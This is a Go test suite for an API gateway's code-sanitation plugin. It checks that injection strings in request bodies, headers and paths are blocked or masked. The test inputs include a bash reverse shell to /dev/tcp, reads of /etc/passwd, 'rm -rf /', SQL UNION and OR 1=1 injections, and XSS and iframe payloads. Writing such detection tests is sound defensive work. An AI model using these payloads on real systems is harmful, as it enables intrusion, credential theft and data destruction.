package code_sanitation_test

import (
	"context"
	"encoding/json"
	"errors"
	"net/http"
	"net/url"
	"testing"

	"github.com/NeuralTrust/TrustGate/pkg/infra/metrics"
	"github.com/NeuralTrust/TrustGate/pkg/infra/plugins/code_sanitation"
	plugintypes "github.com/NeuralTrust/TrustGate/pkg/infra/plugins/types"
	"github.com/NeuralTrust/TrustGate/pkg/types"
	"github.com/sirupsen/logrus"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func newPlugin() *code_sanitation.CodeSanitationPlugin {
	logger := logrus.New()
	logger.SetLevel(logrus.DebugLevel)
	return code_sanitation.NewCodeSanitationPlugin(logger).(*code_sanitation.CodeSanitationPlugin)
}

// ============================================================================
// ValidateConfig Tests
// ============================================================================

func TestCodeSanitationPlugin_ValidateConfig_Valid(t *testing.T) {
	plugin := newPlugin()

	tests := []struct {
		name   string
		config plugintypes.PluginConfig
	}{
		{
			name: "block action with all languages",
			config: plugintypes.PluginConfig{
				Settings: map[string]interface{}{
					"apply_all_languages": true,
					"content_to_check":    []interface{}{"body"},
					"action":              "block",
					"status_code":         400,
				},
			},
		},
		{
			name: "sanitize action",
			config: plugintypes.PluginConfig{
				Settings: map[string]interface{}{
					"apply_all_languages": true,
					"content_to_check":    []interface{}{"body", "headers"},
					"action":              "sanitize",
				},
			},
		},
		{
			name: "specific languages",
			config: plugintypes.PluginConfig{
				Settings: map[string]interface{}{
					"languages": []interface{}{
						map[string]interface{}{"language": "javascript", "enabled": true},
						map[string]interface{}{"language": "sql", "enabled": true},
					},
					"content_to_check": []interface{}{"body"},
					"action":           "block",
					"status_code":      403,
				},
			},
		},
		{
			name: "with custom patterns",
			config: plugintypes.PluginConfig{
				Settings: map[string]interface{}{
					"apply_all_languages": true,
					"content_to_check":    []interface{}{"all"},
					"action":              "block",
					"status_code":         400,
					"custom_patterns": []interface{}{
						map[string]interface{}{
							"name":        "custom_test",
							"pattern":     `\btest_pattern\b`,
							"description": "Test pattern",
						},
					},
				},
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := plugin.ValidateConfig(tt.config)
			assert.NoError(t, err)
		})
	}
}

func TestCodeSanitationPlugin_ValidateConfig_Invalid(t *testing.T) {
	plugin := newPlugin()

	tests := []struct {
		name        string
		config      plugintypes.PluginConfig
		expectedErr string
	}{
		{
			name: "missing content_to_check",
			config: plugintypes.PluginConfig{
				Settings: map[string]interface{}{
					"apply_all_languages": true,
					"action":              "block",
				},
			},
			expectedErr: "at least one content type must be specified",
		},
		{
			name: "invalid content type",
			config: plugintypes.PluginConfig{
				Settings: map[string]interface{}{
					"apply_all_languages": true,
					"content_to_check":    []interface{}{"invalid_type"},
					"action":              "block",
				},
			},
			expectedErr: "invalid content type",
		},
		{
			name: "invalid action",
			config: plugintypes.PluginConfig{
				Settings: map[string]interface{}{
					"apply_all_languages": true,
					"content_to_check":    []interface{}{"body"},
					"action":              "invalid_action",
				},
			},
			expectedErr: "invalid action",
		},
		{
			name: "invalid status code",
			config: plugintypes.PluginConfig{
				Settings: map[string]interface{}{
					"apply_all_languages": true,
					"content_to_check":    []interface{}{"body"},
					"action":              "block",
					"status_code":         99, // Invalid: < 100
				},
			},
			expectedErr: "invalid status code",
		},
		{
			name: "invalid custom pattern regex",
			config: plugintypes.PluginConfig{
				Settings: map[string]interface{}{
					"apply_all_languages": true,
					"content_to_check":    []interface{}{"body"},
					"action":              "block",
					"status_code":         400,
					"custom_patterns": []interface{}{
						map[string]interface{}{
							"name":    "invalid_regex",
							"pattern": `[invalid`,
						},
					},
				},
			},
			expectedErr: "invalid regex pattern",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := plugin.ValidateConfig(tt.config)
			assert.Error(t, err)
			assert.Contains(t, err.Error(), tt.expectedErr)
		})
	}
}

// ============================================================================
// Execute Tests - JavaScript
// ============================================================================

func TestCodeSanitationPlugin_Execute_JavaScript_Eval(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "javascript", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"action":           "sanitize",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"content": "eval('alert(1)')"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)
	assert.Equal(t, http.StatusOK, resp.StatusCode)

	// Verify sanitization - eval should be replaced with ****
	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.Contains(t, result["content"], "****")
	assert.Contains(t, result["content"], "('alert(1)')") // Parameters preserved
	assert.NotContains(t, result["content"], "eval")
}

func TestCodeSanitationPlugin_Execute_JavaScript_ScriptTag(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "javascript", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"action":           "sanitize",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"content": "<script>alert('xss')</script>"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	// Verify sanitization
	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.NotContains(t, result["content"], "<script")
}

// ============================================================================
// Execute Tests - Python
// ============================================================================

func TestCodeSanitationPlugin_Execute_Python_Exec(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "python", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"action":           "sanitize",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"code": "exec('import os')"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.NotContains(t, result["code"], "exec")
	assert.Contains(t, result["code"], "****") // exec replaced
}

func TestCodeSanitationPlugin_Execute_Python_Import(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "python", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"action":           "sanitize",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"input": "import os; os.system('rm -rf /')"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.NotContains(t, result["input"], "import os")
}

// ============================================================================
// Execute Tests - SQL Injection
// ============================================================================

func TestCodeSanitationPlugin_Execute_SQL_Injection(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "sql", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"action":           "block",
			"status_code":      403,
			"error_message":    "SQL injection detected",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"query": "SELECT * FROM users WHERE id = 1 OR 1=1"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.Error(t, err)
	assert.Nil(t, resp)

	var pluginErr *plugintypes.PluginError
	ok := errors.As(err, &pluginErr)
	require.True(t, ok)
	assert.Equal(t, 403, pluginErr.StatusCode)
	assert.Equal(t, "SQL injection detected", pluginErr.Message)
}

func TestCodeSanitationPlugin_Execute_SQL_UnionSelect(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "sql", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"action":           "sanitize",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"search": "' UNION SELECT username, password FROM users--"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.NotContains(t, result["search"], "UNION SELECT")
}

// ============================================================================
// Execute Tests - Shell Commands
// ============================================================================

func TestCodeSanitationPlugin_Execute_Shell_Command(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "shell", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"action":           "block",
			"status_code":      400,
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"cmd": "cat /etc/passwd"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.Error(t, err)
	assert.Nil(t, resp)

	var pluginErr *plugintypes.PluginError
	ok := errors.As(err, &pluginErr)
	require.True(t, ok)
	assert.Equal(t, 400, pluginErr.StatusCode)
}

func TestCodeSanitationPlugin_Execute_Shell_ReverseShell(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "shell", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"action":           "block",
			"status_code":      400,
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"payload": "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.Error(t, err)
	assert.Nil(t, resp)
}

// ============================================================================
// Execute Tests - PHP
// ============================================================================

func TestCodeSanitationPlugin_Execute_PHP_System(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "php", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"action":           "sanitize",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"code": "system('whoami')"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.NotContains(t, result["code"], "system")
	assert.Contains(t, result["code"], "('whoami')") // Parameters preserved
}

// ============================================================================
// Execute Tests - Block vs Sanitize
// ============================================================================

func TestCodeSanitationPlugin_Execute_BlockMode(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"apply_all_languages": true,
			"content_to_check":    []interface{}{"body"},
			"action":              "block",
			"status_code":         403,
			"error_message":       "Code injection blocked",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"content": "eval('malicious')"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.Error(t, err)
	assert.Nil(t, resp)

	var pluginErr *plugintypes.PluginError
	ok := errors.As(err, &pluginErr)
	require.True(t, ok)
	assert.Equal(t, 403, pluginErr.StatusCode)
	assert.Equal(t, "Code injection blocked", pluginErr.Message)
}

func TestCodeSanitationPlugin_Execute_SanitizeMode(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"apply_all_languages": true,
			"content_to_check":    []interface{}{"body"},
			"action":              "sanitize",
		},
	}

	originalBody := `{"content": "eval('malicious')"}`
	req := &types.RequestContext{
		Body: []byte(originalBody),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err) // No error in sanitize mode
	assert.NotNil(t, resp)
	assert.Equal(t, http.StatusOK, resp.StatusCode)

	// Body should be modified
	assert.NotEqual(t, originalBody, string(req.Body))
}

// ============================================================================
// Execute Tests - Headers
// ============================================================================

func TestCodeSanitationPlugin_Execute_Headers(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "javascript", "enabled": true},
			},
			"content_to_check": []interface{}{"headers"},
			"action":           "sanitize",
		},
	}

	headers := make(map[string][]string)
	headers["X-Custom"] = []string{"eval('test')"}
	headers["User-Agent"] = []string{"Mozilla/5.0"}

	req := &types.RequestContext{
		Headers: headers,
		Body:    []byte(`{}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	// Header should be sanitized
	if vals, ok := req.Headers["X-Custom"]; ok && len(vals) > 0 {
		assert.NotContains(t, vals[0], "eval")
	}
	// Safe header unchanged
	if vals, ok := req.Headers["User-Agent"]; ok && len(vals) > 0 {
		assert.Equal(t, "Mozilla/5.0", vals[0])
	}
}

// ============================================================================
// Execute Tests - Path and Query
// ============================================================================

func TestCodeSanitationPlugin_Execute_QueryParams(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "sql", "enabled": true},
			},
			"content_to_check": []interface{}{"path_and_query"},
			"action":           "sanitize",
		},
	}

	query := url.Values{}
	query.Set("id", "1 OR 1=1")
	query.Set("name", "john")

	req := &types.RequestContext{
		Path:  "/api/users",
		Query: query,
		Body:  []byte(`{}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	// Safe query unchanged
	assert.Equal(t, "john", req.Query.Get("name"))
}

func TestCodeSanitationPlugin_Execute_Path(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "shell", "enabled": true},
			},
			"content_to_check": []interface{}{"path_and_query"},
			"action":           "sanitize",
		},
	}

	req := &types.RequestContext{
		Path: "/api/cat /etc/passwd",
		Body: []byte(`{}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	// Path should be sanitized
	assert.NotContains(t, req.Path, "cat /etc/passwd")
}

// ============================================================================
// Execute Tests - Safe Content
// ============================================================================

func TestCodeSanitationPlugin_Execute_SafeContent(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"apply_all_languages": true,
			"content_to_check":    []interface{}{"body"},
			"action":              "block",
			"status_code":         400,
		},
	}

	safeBody := `{"message": "Hello, how are you today?", "count": 42}`
	req := &types.RequestContext{
		Body: []byte(safeBody),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)
	assert.Equal(t, http.StatusOK, resp.StatusCode)

	// Body unchanged
	assert.Equal(t, safeBody, string(req.Body))
}

// ============================================================================
// Execute Tests - Multiple Languages Detection
// ============================================================================

func TestCodeSanitationPlugin_Execute_MultipleLanguages(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"apply_all_languages": true,
			"content_to_check":    []interface{}{"body"},
			"action":              "sanitize",
		},
	}

	// eval exists in multiple languages (JS, Python, PHP, Ruby)
	req := &types.RequestContext{
		Body: []byte(`{"code": "eval('test')"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	// eval should be sanitized
	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.NotContains(t, result["code"], "eval")
}

// ============================================================================
// Execute Tests - Custom Patterns
// ============================================================================

func TestCodeSanitationPlugin_Execute_CustomPattern(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	// Custom patterns work in headers
	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"content_to_check": []interface{}{"headers"},
			"action":           "sanitize",
			"custom_patterns": []interface{}{
				map[string]interface{}{
					"name":         "custom_dangerous",
					"pattern":      `\bdangerous_[a-z]+\b`,
					"description":  "Detect custom dangerous pattern",
					"content_type": "headers",
				},
			},
		},
	}

	headers := make(map[string][]string)
	headers["X-Custom"] = []string{"dangerous_function('test')"}

	req := &types.RequestContext{
		Headers: headers,
		Body:    []byte(`{}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	// Header should be sanitized - custom pattern should match
	if vals, ok := req.Headers["X-Custom"]; ok && len(vals) > 0 {
		assert.NotContains(t, vals[0], "dangerous_function")
	}
}

// ============================================================================
// Execute Tests - All Content Types
// ============================================================================

func TestCodeSanitationPlugin_Execute_AllContentTypes(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "javascript", "enabled": true},
			},
			"content_to_check": []interface{}{"all"},
			"action":           "sanitize",
		},
	}

	headers := make(map[string][]string)
	headers["X-Eval"] = []string{"eval('header')"}

	query := url.Values{}
	query.Set("cmd", "eval('query')")

	req := &types.RequestContext{
		Headers: headers,
		Path:    "/api/test",
		Query:   query,
		Body:    []byte(`{"code": "eval('body')"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	// Body should be sanitized
	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.NotContains(t, result["code"], "eval")

	// Header should be sanitized
	if vals, ok := req.Headers["X-Eval"]; ok && len(vals) > 0 {
		assert.NotContains(t, vals[0], "eval")
	}
}

// ============================================================================
// Execute Tests - Plain Text Body
// ============================================================================

func TestCodeSanitationPlugin_Execute_PlainTextBody(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "javascript", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"action":           "sanitize",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`eval('plain text injection')`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	// Body should be sanitized
	assert.NotContains(t, string(req.Body), "eval")
	assert.Contains(t, string(req.Body), "****")
}

// ============================================================================
// Execute Tests - Empty Body
// ============================================================================

func TestCodeSanitationPlugin_Execute_EmptyBody(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"apply_all_languages": true,
			"content_to_check":    []interface{}{"body"},
			"action":              "block",
			"status_code":         400,
		},
	}

	req := &types.RequestContext{
		Body: []byte{},
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)
	assert.Equal(t, http.StatusOK, resp.StatusCode)
}

// ============================================================================
// Execute Tests - Nested JSON
// ============================================================================

func TestCodeSanitationPlugin_Execute_NestedJSON(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "javascript", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"action":           "sanitize",
		},
	}

	nestedJSON := `{
		"level1": {
			"level2": {
				"code": "eval('nested')"
			}
		},
		"array": [
			{"item": "eval('in array')"},
			"safe string"
		]
	}`

	req := &types.RequestContext{
		Body: []byte(nestedJSON),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	// Verify nested content is sanitized
	assert.NotContains(t, string(req.Body), "eval")
}

// ============================================================================
// Execute Tests - Custom Sanitize Char
// ============================================================================

func TestCodeSanitationPlugin_Execute_CustomSanitizeChar(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "javascript", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"action":           "sanitize",
			"sanitize_char":    "#",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"content": "eval('test')"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.Contains(t, result["content"], "####") // Custom char used
	assert.NotContains(t, result["content"], "eval")
}

// ============================================================================
// Plugin Metadata Tests
// ============================================================================

func TestCodeSanitationPlugin_Name(t *testing.T) {
	plugin := newPlugin()
	assert.Equal(t, "code_sanitation", plugin.Name())
}

func TestCodeSanitationPlugin_AllowedStages(t *testing.T) {
	plugin := newPlugin()
	stages := plugin.AllowedStages()
	assert.Len(t, stages, 1)
	assert.Equal(t, plugintypes.PreRequest, stages[0])
}

func TestCodeSanitationPlugin_RequiredPlugins(t *testing.T) {
	plugin := newPlugin()
	assert.Empty(t, plugin.RequiredPlugins())
}

// ============================================================================
// Execute Tests - HTML Injection
// ============================================================================

func TestCodeSanitationPlugin_Execute_HTML_Injection(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "html", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"action":           "sanitize",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"content": "<iframe src='http://evil.com'></iframe>"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.NotContains(t, result["content"], "<iframe")
}

func TestCodeSanitationPlugin_Execute_HTML_Injection_ApplyAllLanguages(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"apply_all_languages": true,
			"content_to_check":    []interface{}{"body"},
			"action":              "sanitize",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"content": "<iframe src='http://evil.com'></iframe>"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.NotContains(t, result["content"], "<iframe", "iframe should be sanitized when apply_all_languages is true")
}

// ============================================================================
// Execute Tests - Java Code
// ============================================================================

func TestCodeSanitationPlugin_Execute_Java_Runtime(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "java", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"action":           "block",
			"status_code":      400,
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"code": "Runtime.getRuntime().exec('calc')"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.Error(t, err)
	assert.Nil(t, resp)

	var pluginErr *plugintypes.PluginError
	ok := errors.As(err, &pluginErr)
	require.True(t, ok)
	assert.Equal(t, 400, pluginErr.StatusCode)
}

// ============================================================================
// Execute Tests - Ruby Code
// ============================================================================

func TestCodeSanitationPlugin_Execute_Ruby_System(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "ruby", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"action":           "sanitize",
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"code": "system('ls -la')"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.NoError(t, err)
	assert.NotNil(t, resp)

	var result map[string]string
	err = json.Unmarshal(req.Body, &result)
	require.NoError(t, err)
	assert.NotContains(t, result["code"], "system")
}

// ============================================================================
// Execute Tests - CSharp Code
// ============================================================================

func TestCodeSanitationPlugin_Execute_CSharp_Process(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"languages": []interface{}{
				map[string]interface{}{"language": "csharp", "enabled": true},
			},
			"content_to_check": []interface{}{"body"},
			"action":           "block",
			"status_code":      400,
		},
	}

	req := &types.RequestContext{
		Body: []byte(`{"code": "System.Diagnostics.Process.Start('cmd.exe')"}`),
	}
	res := &types.ResponseContext{}
	evtCtx := metrics.NewEventContext("", "", nil)

	resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

	assert.Error(t, err)
	assert.Nil(t, resp)

	var pluginErr *plugintypes.PluginError
	ok := errors.As(err, &pluginErr)
	require.True(t, ok)
	assert.Equal(t, 400, pluginErr.StatusCode)
}
